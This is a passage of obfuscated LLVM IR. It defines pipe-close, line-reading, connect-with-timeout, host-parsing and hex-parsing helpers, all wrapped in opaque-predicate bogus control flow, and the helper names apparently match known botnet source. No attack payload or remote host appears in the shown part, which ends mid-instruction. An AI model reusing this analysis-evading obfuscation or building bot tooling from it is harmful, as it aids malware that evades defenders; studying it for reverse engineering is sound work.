  %266 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %267 = load i32, i32* %266, align 4
  %268 = icmp ne i32 %267, 1
  br label %originalBB13

originalBB17alteredBB:                            ; preds = %originalBB17, %136
  %269 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %270 = load i32, i32* %269, align 4
  %271 = call i32 @dup2(i32 %270, i32 1) #2
  %272 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %273 = load i32, i32* %272, align 4
  %274 = call i32 @close(i32 %273)
  br label %originalBB17

originalBB21alteredBB:                            ; preds = %originalBB21, %159
  %275 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %276 = load i32, i32* %275, align 4
  %277 = call i32 @close(i32 %276)
  br label %originalBB21

originalBB25alteredBB:                            ; preds = %originalBB25, %190
  %278 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %279 = load i32, i32* %278, align 4
  %280 = call i32 @close(i32 %279)
  br label %originalBB25

originalBB29alteredBB:                            ; preds = %originalBB29, %224
  %281 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %282 = load i32, i32* %281, align 4
  store i32 %282, i32* %6, align 4
  %283 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %284 = load i32, i32* %283, align 4
  %285 = call i32 @close(i32 %284)
  br label %originalBB29
}

; Function Attrs: nounwind
declare i32 @pipe(i32*) #4

; Function Attrs: nounwind
declare i32 @getdtablesize() #4

; Function Attrs: nounwind returns_twice
declare i32 @vfork() #6

declare i32 @close(i32) #3

; Function Attrs: nounwind
declare i32 @dup2(i32, i32) #4

; Function Attrs: nounwind
declare i32 @execl(i8*, i8*, ...) #4

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define i32 @fdpclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.__sigset_t, align 8
  %6 = alloca %struct.__sigset_t, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.in_addr, align 4
  store i32 %0, i32* %3, align 4
  %10 = load i32*, i32** @fdopen_pids, align 8
  %11 = icmp eq i32* %10, null
  br i1 %11, label %35, label %12

; <label>:12:                                     ; preds = %1
  %13 = load i32, i32* @x.21
  %14 = load i32, i32* @y.22
  %15 = sub i32 %13, 1
  %16 = mul i32 %13, %15
  %17 = urem i32 %16, 2
  %18 = icmp eq i32 %17, 0
  %19 = icmp slt i32 %14, 10
  %20 = or i1 %18, %19
  br i1 %20, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %12
  %21 = load i32*, i32** @fdopen_pids, align 8
  %22 = load i32, i32* %3, align 4
  %23 = sext i32 %22 to i64
  %24 = getelementptr inbounds i32, i32* %21, i64 %23
  %25 = load i32, i32* %24, align 4
  %26 = icmp eq i32 %25, 0
  %27 = load i32, i32* @x.21
  %28 = load i32, i32* @y.22
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %26, label %35, label %52

; <label>:35:                                     ; preds = %originalBBpart2, %1
  %36 = load i32, i32* @x.21
  %37 = load i32, i32* @y.22
  %38 = sub i32 %36, 1
  %39 = mul i32 %36, %38
  %40 = urem i32 %39, 2
  %41 = icmp eq i32 %40, 0
  %42 = icmp slt i32 %37, 10
  %43 = or i1 %41, %42
  br i1 %43, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %35
  store i32 -1, i32* %2, align 4
  %44 = load i32, i32* @x.21
  %45 = load i32, i32* @y.22
  %46 = sub i32 %44, 1
  %47 = mul i32 %44, %46
  %48 = urem i32 %47, 2
  %49 = icmp eq i32 %48, 0
  %50 = icmp slt i32 %45, 10
  %51 = or i1 %49, %50
  br i1 %51, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %142

; <label>:52:                                     ; preds = %originalBBpart2
  %53 = load i32, i32* %3, align 4
  %54 = call i32 @close(i32 %53)
  %55 = call i32 @sigemptyset(%struct.__sigset_t* %6) #2
  %56 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 2) #2
  %57 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 3) #2
  %58 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 1) #2
  %59 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* %6, %struct.__sigset_t* %5) #2
  br label %60

; <label>:60:                                     ; preds = %originalBBpart212, %52
  %61 = load i32*, i32** @fdopen_pids, align 8
  %62 = load i32, i32* %3, align 4
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds i32, i32* %61, i64 %63
  %65 = load i32, i32* %64, align 4
  %66 = call i32 @waitpid(i32 %65, i32* %7, i32 0)
  store i32 %66, i32* %8, align 4
  br label %67

; <label>:67:                                     ; preds = %60
  %68 = load i32, i32* @x.21
  %69 = load i32, i32* @y.22
  %70 = sub i32 %68, 1
  %71 = mul i32 %68, %70
  %72 = urem i32 %71, 2
  %73 = icmp eq i32 %72, 0
  %74 = icmp slt i32 %69, 10
  %75 = or i1 %73, %74
  br i1 %75, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %67
  %76 = load i32, i32* %8, align 4
  %77 = icmp eq i32 %76, -1
  %78 = load i32, i32* @x.21
  %79 = load i32, i32* @y.22
  %80 = sub i32 %78, 1
  %81 = mul i32 %78, %80
  %82 = urem i32 %81, 2
  %83 = icmp eq i32 %82, 0
  %84 = icmp slt i32 %79, 10
  %85 = or i1 %83, %84
  br i1 %85, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %77, label %86, label %90

; <label>:86:                                     ; preds = %originalBBpart28
  %87 = call i32* @__errno_location() #13
  %88 = load i32, i32* %87, align 4
  %89 = icmp eq i32 %88, 4
  br label %90

; <label>:90:                                     ; preds = %86, %originalBBpart28
  %91 = phi i1 [ false, %originalBBpart28 ], [ %89, %86 ]
  %92 = load i32, i32* @x.21
  %93 = load i32, i32* @y.22
  %94 = sub i32 %92, 1
  %95 = mul i32 %92, %94
  %96 = urem i32 %95, 2
  %97 = icmp eq i32 %96, 0
  %98 = icmp slt i32 %93, 10
  %99 = or i1 %97, %98
  br i1 %99, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %90
  %100 = load i32, i32* @x.21
  %101 = load i32, i32* @y.22
  %102 = sub i32 %100, 1
  %103 = mul i32 %100, %102
  %104 = urem i32 %103, 2
  %105 = icmp eq i32 %104, 0
  %106 = icmp slt i32 %101, 10
  %107 = or i1 %105, %106
  br i1 %107, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %91, label %60, label %108

; <label>:108:                                    ; preds = %originalBBpart212
  %109 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* %5, %struct.__sigset_t* null) #2
  %110 = load i32*, i32** @fdopen_pids, align 8
  %111 = load i32, i32* %4, align 4
  %112 = sext i32 %111 to i64
  %113 = getelementptr inbounds i32, i32* %110, i64 %112
  store i32 0, i32* %113, align 4
  %114 = load i32, i32* %8, align 4
  %115 = icmp eq i32 %114, -1
  br i1 %115, label %116, label %117

; <label>:116:                                    ; preds = %108
  br label %124

; <label>:117:                                    ; preds = %108
  %118 = bitcast %struct.in_addr* %9 to i32*
  %119 = load i32, i32* %7, align 4
  store i32 %119, i32* %118, align 4
  %120 = bitcast %struct.in_addr* %9 to i32*
  %121 = load i32, i32* %120, align 4
  %122 = and i32 %121, 65280
  %123 = ashr i32 %122, 8
  br label %124

; <label>:124:                                    ; preds = %117, %116
  %125 = phi i32 [ -1, %116 ], [ %123, %117 ]
  %126 = load i32, i32* @x.21
  %127 = load i32, i32* @y.22
  %128 = sub i32 %126, 1
  %129 = mul i32 %126, %128
  %130 = urem i32 %129, 2
  %131 = icmp eq i32 %130, 0
  %132 = icmp slt i32 %127, 10
  %133 = or i1 %131, %132
  br i1 %133, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %124
  store i32 %125, i32* %2, align 4
  %134 = load i32, i32* @x.21
  %135 = load i32, i32* @y.22
  %136 = sub i32 %134, 1
  %137 = mul i32 %134, %136
  %138 = urem i32 %137, 2
  %139 = icmp eq i32 %138, 0
  %140 = icmp slt i32 %135, 10
  %141 = or i1 %139, %140
  br i1 %141, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %142

; <label>:142:                                    ; preds = %originalBBpart216, %originalBBpart24
  %143 = load i32, i32* %2, align 4
  ret i32 %143

originalBBalteredBB:                              ; preds = %originalBB, %12
  %144 = load i32*, i32** @fdopen_pids, align 8
  %145 = load i32, i32* %3, align 4
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds i32, i32* %144, i64 %146
  %148 = load i32, i32* %147, align 4
  %149 = icmp eq i32 %148, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %35
  store i32 -1, i32* %2, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %67
  %150 = load i32, i32* %8, align 4
  %151 = icmp eq i32 %150, -1
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %90
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %124
  store i32 %125, i32* %2, align 4
  br label %originalBB14
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) #4

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) #4

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) #4

declare i32 @waitpid(i32, i32*, i32) #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #8

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) #0 {
  %4 = load i32, i32* @x.23
  %5 = load i32, i32* @y.24
  %6 = sub i32 %4, 1
  %7 = mul i32 %4, %6
  %8 = urem i32 %7, 2
  %9 = icmp eq i32 %8, 0
  %10 = icmp slt i32 %5, 10
  %11 = or i1 %9, %10
  br i1 %11, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %3
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  store i8* %0, i8** %12, align 8
  store i32 %1, i32* %13, align 4
  store i32 %2, i32* %14, align 4
  store i32 1, i32* %15, align 4
  store i32 0, i32* %16, align 4
  %17 = load i32, i32* @x.23
  %18 = load i32, i32* @y.24
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %25

; <label>:25:                                     ; preds = %59, %originalBBpart2
  %26 = load i32, i32* @x.23
  %27 = load i32, i32* @y.24
  %28 = sub i32 %26, 1
  %29 = mul i32 %26, %28
  %30 = urem i32 %29, 2
  %31 = icmp eq i32 %30, 0
  %32 = icmp slt i32 %27, 10
  %33 = or i1 %31, %32
  br i1 %33, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %25
  %34 = load i32, i32* %15, align 4
  %35 = icmp eq i32 %34, 1
  %36 = load i32, i32* @x.23
  %37 = load i32, i32* @y.24
  %38 = sub i32 %36, 1
  %39 = mul i32 %36, %38
  %40 = urem i32 %39, 2
  %41 = icmp eq i32 %40, 0
  %42 = icmp slt i32 %37, 10
  %43 = or i1 %41, %42
  br i1 %43, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %35, label %44, label %57

; <label>:44:                                     ; preds = %originalBBpart24
  %45 = load i32, i32* %16, align 4
  %46 = load i32, i32* %13, align 4
  %47 = icmp slt i32 %45, %46
  br i1 %47, label %48, label %57

; <label>:48:                                     ; preds = %44
  %49 = load i8*, i8** %12, align 8
  %50 = load i32, i32* %16, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds i8, i8* %49, i64 %51
  %53 = getelementptr inbounds i8, i8* %52, i64 -1
  %54 = load i8, i8* %53, align 1
  %55 = zext i8 %54 to i32
  %56 = icmp ne i32 %55, 10
  br label %57

; <label>:57:                                     ; preds = %48, %44, %originalBBpart24
  %58 = phi i1 [ false, %44 ], [ false, %originalBBpart24 ], [ %56, %48 ]
  br i1 %58, label %59, label %69

; <label>:59:                                     ; preds = %57
  %60 = load i32, i32* %14, align 4
  %61 = load i8*, i8** %12, align 8
  %62 = load i32, i32* %16, align 4
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds i8, i8* %61, i64 %63
  %65 = call i64 @read(i32 %60, i8* %64, i64 1)
  %66 = trunc i64 %65 to i32
  store i32 %66, i32* %15, align 4
  %67 = load i32, i32* %16, align 4
  %68 = add nsw i32 %67, 1
  store i32 %68, i32* %16, align 4
  br label %25

; <label>:69:                                     ; preds = %57
  %70 = load i32, i32* %15, align 4
  %71 = icmp eq i32 %70, 0
  br i1 %71, label %72, label %73

; <label>:72:                                     ; preds = %69
  br label %75

; <label>:73:                                     ; preds = %69
  %74 = load i8*, i8** %12, align 8
  br label %75

; <label>:75:                                     ; preds = %73, %72
  %76 = phi i8* [ null, %72 ], [ %74, %73 ]
  %77 = load i32, i32* @x.23
  %78 = load i32, i32* @y.24
  %79 = sub i32 %77, 1
  %80 = mul i32 %77, %79
  %81 = urem i32 %80, 2
  %82 = icmp eq i32 %81, 0
  %83 = icmp slt i32 %78, 10
  %84 = or i1 %82, %83
  br i1 %84, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %75
  %85 = load i32, i32* @x.23
  %86 = load i32, i32* @y.24
  %87 = sub i32 %85, 1
  %88 = mul i32 %85, %87
  %89 = urem i32 %88, 2
  %90 = icmp eq i32 %89, 0
  %91 = icmp slt i32 %86, 10
  %92 = or i1 %90, %91
  br i1 %92, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  ret i8* %76

originalBBalteredBB:                              ; preds = %originalBB, %3
  %93 = alloca i8*, align 8
  %94 = alloca i32, align 4
  %95 = alloca i32, align 4
  %96 = alloca i32, align 4
  %97 = alloca i32, align 4
  store i8* %0, i8** %93, align 8
  store i32 %1, i32* %94, align 4
  store i32 %2, i32* %95, align 4
  store i32 1, i32* %96, align 4
  store i32 0, i32* %97, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %25
  %98 = load i32, i32* %15, align 4
  %99 = icmp eq i32 %98, 1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %75
  br label %originalBB6
}

declare i64 @read(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = or i64 %22, 2048
  store i64 %23, i64* %15, align 8
  %24 = load i32, i32* %6, align 4
  %25 = load i64, i64* %15, align 8
  %26 = call i32 (i32, i32, ...) @fcntl(i32 %24, i32 4, i64 %25)
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %8, align 4
  %29 = trunc i32 %28 to i16
  %30 = call zeroext i16 @htons(i16 zeroext %29) #13
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = load i8*, i8** %7, align 8
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %34 = call i32 @getHost(i8* %32, %struct.in_addr* %33)
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %4
  store i32 0, i32* %5, align 4
  br label %164

; <label>:37:                                     ; preds = %4
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %39 = getelementptr inbounds [8 x i8], [8 x i8]* %38, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %39, i8 0, i64 8, i32 4, i1 false)
  %40 = load i32, i32* %6, align 4
  %41 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %42 = call i32 @connect(i32 %40, %struct.sockaddr* %41, i32 16)
  store i32 %42, i32* %16, align 4
  %43 = load i32, i32* %16, align 4
  %44 = icmp slt i32 %43, 0
  br i1 %44, label %45, label %155

; <label>:45:                                     ; preds = %37
  %46 = call i32* @__errno_location() #13
  %47 = load i32, i32* %46, align 4
  %48 = icmp eq i32 %47, 115
  br i1 %48, label %49, label %153

; <label>:49:                                     ; preds = %45
  %50 = load i32, i32* @x.25
  %51 = load i32, i32* @y.26
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %49
  %58 = load i32, i32* %9, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %59, i64* %60, align 8
  %61 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %61, align 8
  %62 = load i32, i32* @x.25
  %63 = load i32, i32* @y.26
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %70

; <label>:70:                                     ; preds = %originalBBpart2
  %71 = load i32, i32* @x.25
  %72 = load i32, i32* @y.26
  %73 = sub i32 %71, 1
  %74 = mul i32 %71, %73
  %75 = urem i32 %74, 2
  %76 = icmp eq i32 %75, 0
  %77 = icmp slt i32 %72, 10
  %78 = or i1 %76, %77
  br i1 %78, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %70
  %79 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %80 = getelementptr inbounds [16 x i64], [16 x i64]* %79, i64 0, i64 0
  %81 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %80) #2, !srcloc !1
  %82 = extractvalue { i64, i64* } %81, 0
  %83 = extractvalue { i64, i64* } %81, 1
  %84 = trunc i64 %82 to i32
  store i32 %84, i32* %17, align 4
  %85 = ptrtoint i64* %83 to i64
  %86 = trunc i64 %85 to i32
  store i32 %86, i32* %18, align 4
  %87 = load i32, i32* @x.25
  %88 = load i32, i32* @y.26
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %95

; <label>:95:                                     ; preds = %originalBBpart24
  %96 = load i32, i32* %6, align 4
  %97 = srem i32 %96, 64
  %98 = zext i32 %97 to i64
  %99 = shl i64 1, %98
  %100 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %101 = load i32, i32* %6, align 4
  %102 = sdiv i32 %101, 64
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds [16 x i64], [16 x i64]* %100, i64 0, i64 %103
  %105 = load i64, i64* %104, align 8
  %106 = or i64 %105, %99
  store i64 %106, i64* %104, align 8
  %107 = load i32, i32* %6, align 4
  %108 = add nsw i32 %107, 1
  %109 = call i32 @select(i32 %108, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  %110 = icmp sgt i32 %109, 0
  br i1 %110, label %111, label %151

; <label>:111:                                    ; preds = %95
  %112 = load i32, i32* @x.25
  %113 = load i32, i32* @y.26
  %114 = sub i32 %112, 1
  %115 = mul i32 %112, %114
  %116 = urem i32 %115, 2
  %117 = icmp eq i32 %116, 0
  %118 = icmp slt i32 %113, 10
  %119 = or i1 %117, %118
  br i1 %119, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %111
  store i32 4, i32* %13, align 4
  %120 = load i32, i32* %6, align 4
  %121 = bitcast i32* %14 to i8*
  %122 = call i32 @getsockopt(i32 %120, i32 1, i32 4, i8* %121, i32* %13) #2
  %123 = load i32, i32* %14, align 4
  %124 = icmp ne i32 %123, 0
  %125 = load i32, i32* @x.25
  %126 = load i32, i32* @y.26
  %127 = sub i32 %125, 1
  %128 = mul i32 %125, %127
  %129 = urem i32 %128, 2
  %130 = icmp eq i32 %129, 0
  %131 = icmp slt i32 %126, 10
  %132 = or i1 %130, %131
  br i1 %132, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %124, label %133, label %150

; <label>:133:                                    ; preds = %originalBBpart28
  %134 = load i32, i32* @x.25
  %135 = load i32, i32* @y.26
  %136 = sub i32 %134, 1
  %137 = mul i32 %134, %136
  %138 = urem i32 %137, 2
  %139 = icmp eq i32 %138, 0
  %140 = icmp slt i32 %135, 10
  %141 = or i1 %139, %140
  br i1 %141, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %133
  store i32 0, i32* %5, align 4
  %142 = load i32, i32* @x.25
  %143 = load i32, i32* @y.26
  %144 = sub i32 %142, 1
  %145 = mul i32 %142, %144
  %146 = urem i32 %145, 2
  %147 = icmp eq i32 %146, 0
  %148 = icmp slt i32 %143, 10
  %149 = or i1 %147, %148
  br i1 %149, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %164

; <label>:150:                                    ; preds = %originalBBpart28
  br label %152

; <label>:151:                                    ; preds = %95
  store i32 0, i32* %5, align 4
  br label %164

; <label>:152:                                    ; preds = %150
  br label %154

; <label>:153:                                    ; preds = %45
  store i32 0, i32* %5, align 4
  br label %164

; <label>:154:                                    ; preds = %152
  br label %155

; <label>:155:                                    ; preds = %154, %37
  %156 = load i32, i32* %6, align 4
  %157 = call i32 (i32, i32, ...) @fcntl(i32 %156, i32 3, i8* null)
  %158 = sext i32 %157 to i64
  store i64 %158, i64* %15, align 8
  %159 = load i64, i64* %15, align 8
  %160 = and i64 %159, -2049
  store i64 %160, i64* %15, align 8
  %161 = load i32, i32* %6, align 4
  %162 = load i64, i64* %15, align 8
  %163 = call i32 (i32, i32, ...) @fcntl(i32 %161, i32 4, i64 %162)
  store i32 1, i32* %5, align 4
  br label %164

; <label>:164:                                    ; preds = %155, %153, %151, %originalBBpart212, %36
  %165 = load i32, i32* %5, align 4
  ret i32 %165

originalBBalteredBB:                              ; preds = %originalBB, %49
  %166 = load i32, i32* %9, align 4
  %167 = sext i32 %166 to i64
  %168 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %167, i64* %168, align 8
  %169 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %169, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %70
  %170 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %171 = getelementptr inbounds [16 x i64], [16 x i64]* %170, i64 0, i64 0
  %172 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %171) #2, !srcloc !1
  %173 = extractvalue { i64, i64* } %172, 0
  %174 = extractvalue { i64, i64* } %172, 1
  %175 = trunc i64 %173 to i32
  store i32 %175, i32* %17, align 4
  %176 = ptrtoint i64* %174 to i64
  %177 = trunc i64 %176 to i32
  store i32 %177, i32* %18, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %111
  store i32 4, i32* %13, align 4
  %178 = load i32, i32* %6, align 4
  %179 = bitcast i32* %14 to i8*
  %180 = call i32 @getsockopt(i32 %178, i32 1, i32 4, i8* %179, i32* %13) #2
  %181 = load i32, i32* %14, align 4
  %182 = icmp ne i32 %181, 0
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %133
  store i32 0, i32* %5, align 4
  br label %originalBB10
}

declare i32 @fcntl(i32, i32, ...) #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #8

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #2
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  store i32 %8, i32* %10, align 4
  %11 = icmp eq i32 %8, -1
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %2
  store i32 1, i32* %3, align 4
  br label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %14

; <label>:14:                                     ; preds = %13, %12
  %15 = load i32, i32* %3, align 4
  ret i32 %15
}

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

declare i32 @select(i32, %struct.__sigset_t*, %struct.__sigset_t*, %struct.__sigset_t*, %struct.timeval*) #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #4

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #4

; Function Attrs: noinline nounwind uwtable
define i64 @parseHex(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  store i8* %0, i8** %2, align 8
  store i64 0, i64* %3, align 8
  br label %4

; <label>:4:                                      ; preds = %originalBBpart2, %1
  %5 = load i8*, i8** %2, align 8
  %6 = load i8, i8* %5, align 1
  %7 = zext i8 %6 to i32
  %8 = icmp ne i32 %7, 0
  br i1 %8, label %9, label %12

; <label>:9:                                      ; preds = %4
  %10 = load i64, i64* %3, align 8
  %11 = icmp sge i64 %10, 0
  br label %12

; <label>:12:                                     ; preds = %9, %4
  %13 = phi i1 [ false, %4 ], [ %11, %9 ]
  br i1 %13, label %14, label %40

; <label>:14:                                     ; preds = %12
  %15 = load i32, i32* @x.29
  %16 = load i32, i32* @y.30
  %17 = sub i32 %15, 1
  %18 = mul i32 %15, %17
  %19 = urem i32 %18, 2
  %20 = icmp eq i32 %19, 0
  %21 = icmp slt i32 %16, 10
  %22 = or i1 %20, %21
  br i1 %22, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %14
  %23 = load i64, i64* %3, align 8
  %24 = shl i64 %23, 4
  %25 = load i8*, i8** %2, align 8
  %26 = getelementptr inbounds i8, i8* %25, i32 1
  store i8* %26, i8** %2, align 8
  %27 = load i8, i8* %25, align 1
  %28 = zext i8 %27 to i64
  %29 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %28
  %30 = load i64, i64* %29, align 8
  %31 = or i64 %24, %30
  store i64 %31, i64* %3, align 8
  %32 = load i32, i32* @x.29
  %33 = load i32, i32* @y.30
  %34 = sub i32 %32, 1
  %35 = mul i32 %32, %34
  %36 = urem i32 %35, 2
  %37 = icmp eq i32 %36, 0
  %38 = icmp slt i32 %33, 10
  %39 = or i1 %37, %38
  br i1 %39, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %4

; <label>:40:                                     ; preds = %12
  %41 = load i64, i64* %3, align 8
  ret i64 %41

originalBBalteredBB:                              ; preds = %originalBB, %14
  %42 = load i64, i64* %3, align 8
  %_ = shl i64 %42, 4
  %_1 = sub i64 0, %42
  %gen = add i64 %_1, 4
